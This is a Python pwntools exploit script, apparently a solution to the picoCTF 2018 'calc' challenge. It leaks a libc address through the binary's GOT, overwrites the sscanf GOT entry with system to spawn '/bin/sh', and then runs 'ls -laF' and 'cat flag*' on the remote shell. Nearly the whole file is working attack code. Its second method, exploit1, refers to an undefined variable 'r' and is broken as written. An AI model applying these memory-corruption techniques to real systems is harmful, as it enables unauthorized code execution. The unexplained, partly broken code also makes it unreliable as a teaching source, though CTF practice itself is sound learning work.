#! /usr/bin/env python
import os
#
from pwn import context, p64, u64, log, process, remote, args
from pwn import gdb, ELF
context.clear(arch='amd64', os='linux')


HERE_DIR = os.path.dirname(os.path.abspath(__file__))


class Attack:
    def __init__(self, host, port, elf_name, libc_name=None, lib_path=None, ld_linux_name=None, gdb_script=None):
        self.host, self.port = host, port
        self.elf_name, self.libc_name = elf_name, libc_name
        self.lib_path = lib_path
        self.ld_linux_name = ld_linux_name
        self.gdb_script = gdb_script

        self.elf = ELF(self.elf_name)

        if libc_name:
            self.libc = ELF(self.libc_name)

        self.p = None


    def get_process(self, ld_preload=False, ld_linux=False):
        p = None
        if args.REMOTE:
            p = remote(self.host, self.port)
        else:
            env = {}
            if self.lib_path:
                env['LD_LIBRARY_PATH'] = self.lib_path
            if ld_preload:
                env['LD_PRELOAD'] = self.libc_name

            argv = []
            if ld_linux:
                argv.append(self.ld_linux_name)

            argv.append(self.elf_name)
            p = process(argv, env=env)
            if args.GDB:
                gdb.attach(p.pid, self.gdb_script)
        return p


    def send_expression(self, s):
        self.p.sendlineafter('>> ', s)


    def leak_plt(self):
        self.p.recvuntil('Running H\n')
        self.p.recvuntil('Running ')
        leak = self.p.recv(6)
        return u64(leak.ljust(8, '\x00'))


    def exploit1(self):
        elf = self.elf
        libc = self.libc
        with self.get_process(ld_preload=True, ld_linux=True) as self.p:
            pay = (': %s 7 + + + + + + + ' % (c) for c in ('a', 'b', 'c', 'd', 'e'))
            payload = ''.join(pay)
            self.send_expression(payload)
            payload = ': f 7 + + + + + + +'.rjust(0x6f, ' ')
            self.send_expression(payload)
            pay = ': a 8 + + + + + + + + '
            pay += 'f'
            pay = pay.ljust(0x20, '\x00')
            pay += p64(7) + p64(0x601b80)
            pay += p64(6) + p64(0x601c88)
            pay += p64(6) + p64(0x601c90)
            pay += p64(7) + p64(0x601c88)
            pay += p64(5)
            self.send_expression(pay)

            self.p.recvuntil('Running ')
            self.p.recvuntil('Running ')
            heap = u64(r.recvline()[:-1].ljust(8, '\x00'))
            heap_base = heap - 0x470
            print hex(heap_base)
            self.p.recvuntil('Running ')
            libc.address = u64(r.recvline()[:-1].ljust(8, '\x00')) - libc.symbols['free']
            print hex(libc.address)

            pay = '/bin/sh; f '.ljust(16, '\x00')
            pay += p64(5) + p64(heap_base+0x450)
            pay += p64(heap_base + 0x50) + p64(1)
            pay += p64(7) + p64(heap_base+0x28)
            pay += p64(libc.symbols['system']) + p64(0)
            pay += p64(5) + p64(0)
            pay += p64(5)
            self.p.sendlineafter('>> ', pay)

            self.p.interactive()


    def exploit(self):
        elf = self.elf
        libc = self.libc
        # 0xf1147 execve("/bin/sh", rsp+0x70, environ)
        # constraints:
        #   [rsp+0x70] == NULL
        libc.symbols['one_gadget'] = 0xf1147

        name1 = 0x400012  # ">"
        name2 = 0x400020  # "@"
        name3 = 0x40003c  # "%"

        with self.get_process(ld_preload=True, ld_linux=True) as self.p:
            payload = '0 0 0 : F 1 0 : G 1 : F 1 0 G %s G : H 1 > = %s H = 0 : A 1 0 : B 1 0 : AR 1 : A 1 0 : BR 1 : B 1 0 AR'
            payload = payload % (name1, elf.got['__isoc99_sscanf'])
            self.send_expression(payload)

            ADDR_sscanf = self.leak_plt()
            libc.address = ADDR_sscanf - libc.sym['__isoc99_sscanf']
            ADDR_system = libc.sym['system']
            log.info('sscanf : %s', hex(ADDR_sscanf))
            log.info('libc   : %s', hex(libc.address))
            log.info('system : %s', hex(ADDR_system))

            payload = '%s AR : @ 1 %s = = BR %s BR : %% 1 %s /bin/sh'
            payload = payload % (name2, elf.got['__isoc99_sscanf'] - 8, name3, ADDR_system)
            self.send_expression(payload)

            self.p.recvuntil('Running BR\n')
            self.p.recvuntil('Running BR\n')
            self.p.sendline('ls -laF')
            self.p.sendline('cat flag*')
            self.p.interactive()


if __name__ == "__main__":
    host, port = '2018shell3.picoctf.com', 54291
    elf_name, libc_name = 'calc', 'libc.so.6'
    ld_linux_name = 'ld-linux.so.2'
    elf_name = os.path.join(HERE_DIR, elf_name)
    libc_name = os.path.join(HERE_DIR, libc_name)
    ld_linux_name = os.path.join(HERE_DIR, ld_linux_name)

    gdb_script = r"""
set stop-on-solib-events 1
c
c
add-symbol-file %s 0x400920
b 286
enable
source ~/.gdbinit-gef.py
gef config context.enable false
c
""" % (elf_name)

    attack = Attack(host, port, elf_name, libc_name, ld_linux_name=ld_linux_name, gdb_script=gdb_script)
    attack.exploit()
